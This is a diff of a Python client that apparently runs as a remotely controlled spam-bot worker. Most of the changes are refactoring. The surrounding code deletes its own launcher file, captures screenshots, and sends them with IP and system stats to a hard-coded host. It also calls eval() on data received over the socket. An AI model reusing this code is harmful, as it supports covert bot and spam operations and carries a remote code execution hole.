@@ -1,12 +1,8 @@
-from PIL import ImageGrab
-
-BUFFER_SIZE = 1024*10
+BUFFER_SIZE = 1024 * 10
 host_ip = '192.168.1.2'
 HOST_PORT = 59999
 
-from os import remove
-remove('runner.py')
-
+from PIL import ImageGrab
 from pyautogui import size
 from ping3 import ping
 from psutil import cpu_percent as cpu
@@ -18,6 +14,9 @@ from os import system as system_caller
 from threading import Thread
 import socket
 from platform import system
+
+from os import remove
+remove('runner.py')
 
 connection_enabled = True
 comment = current_ip = last_ip = ''
@@ -278,13 +277,13 @@ def send_data():
     send_data_connection.settimeout(5)
     while True:
         try:
-            WEBSITE_IMG_SIZE = eval(__receive_from_connection(send_data_connection))
-            if WEBSITE_IMG_SIZE == "":
+            website_img_size = eval(__receive_from_connection(send_data_connection))
+            if website_img_size == "":
                 pass
             else:
                 update_cpu_ram()
                 uptime_calculator()
-                ss = ImageGrab.grab().resize(size=WEBSITE_IMG_SIZE).tobytes()
+                ss = ImageGrab.grab().resize(size=website_img_size).tobytes()
                 current_data = {'public_ip': current_ip, 'success': success, 'failure': failure, 'cpu': host_cpu,
                                 'ram': host_ram, 'working_cond': working_cond[continue_spam], 'uptime': uptime,
                                 'img': ss}
@@ -318,6 +317,7 @@ while True:
                 instance_start_time = time()
                 available_instances.remove(instance)
                 sock = force_connect_server('tcp')
+                system_caller('cls')
                 Thread(target=run_instance, args=(instance,)).start()
 
             except Exception as e:
